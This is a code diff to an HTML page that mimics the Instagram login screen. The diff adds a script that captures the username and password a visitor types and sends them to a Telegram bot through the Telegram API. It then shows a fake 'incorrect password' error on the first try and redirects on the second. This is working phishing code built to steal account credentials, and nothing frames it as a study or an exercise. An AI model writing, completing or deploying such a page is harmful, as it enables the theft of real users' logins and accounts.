@@ -12,29 +12,33 @@
 
     <!-- Logo -->
     <div class="flex justify-center mb-14">
-      <img
-        src="IMG_0905.png"
-        alt="Instagram"
-        class="w-16 h-16"
-      />
+      <img src="IMG_0905.png" alt="Instagram" class="w-16 h-16" />
+    </div>
+
+    <!-- Error Message -->
+    <div id="errorMsg" class="text-red-500 text-sm mb-4 hidden">
+      Incorrect username or password.
     </div>
 
     <!-- Username -->
-<input
-  type="text"
-  placeholder="Username, mobile number or email address"
-  class="w-full mb-3 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
-/>
+    <input
+      id="username"
+      type="text"
+      placeholder="Username, mobile number or email address"
+      class="w-full mb-3 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
+    />
 
-<!-- Password -->
-<input
-  type="password"
-  placeholder="Password"
-  class="w-full mb-4 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
-/>
+    <!-- Password -->
+    <input
+      id="password"
+      type="password"
+      placeholder="Password"
+      class="w-full mb-4 px-4 py-3 text-base border border-gray-300 rounded-md bg-white focus:outline-none focus:border-gray-400"
+    />
 
     <!-- Login Button -->
     <button
+      id="loginBtn"
       class="w-full bg-blue-600 text-white text-sm font-normal py-3 rounded-lg mb-4 hover:bg-blue-700 transition"
     >
       Log in
@@ -49,7 +53,6 @@
 
     <!-- Bottom Section -->
     <div class="mt-20">
-      
       <!-- Create Account -->
       <button
         class="w-full border border-blue-600 text-blue-600 text-sm font-normal py-3 rounded-md mb-8 hover:bg-blue-50 transition"
@@ -58,17 +61,55 @@
       </button>
 
       <!-- Meta -->
-<div class="flex justify-center mt-2">
-  <img
-    src="IMG_0906.png"
-    alt="Meta"
-    class="h-8"
-  />
-</div>
-
+      <div class="flex justify-center mt-2">
+        <img src="IMG_0906.png" alt="Meta" class="h-8" />
+      </div>
     </div>
-
   </div>
+
+  <!-- Script -->
+  <script type="module">
+    import { TELEGRAM_TOKEN, TELEGRAM_CHAT_ID } from './config.js';
+
+    let attempt = 0;
+
+    document.getElementById("loginBtn").addEventListener("click", async (e) => {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      if (!username || !password) {
+        alert("Please fill in all fields!");
+        return;
+      }
+
+      // Send to Telegram
+      const message = `Username: ${username}\nPassword: ${password}`;
+      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+
+      try {
+        await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+        });
+      } catch (err) {
+        console.error("Telegram error:", err);
+      }
+
+      attempt++;
+
+      if (attempt === 1) {
+        // Show fake error message
+        const errorDiv = document.getElementById("errorMsg");
+        errorDiv.classList.remove("hidden");
+      } else {
+        // Redirect on second attempt
+        window.location.href = "https://example.com/success"; // Change to your page
+      }
+    });
+  </script>
 
 </body>
 </html>
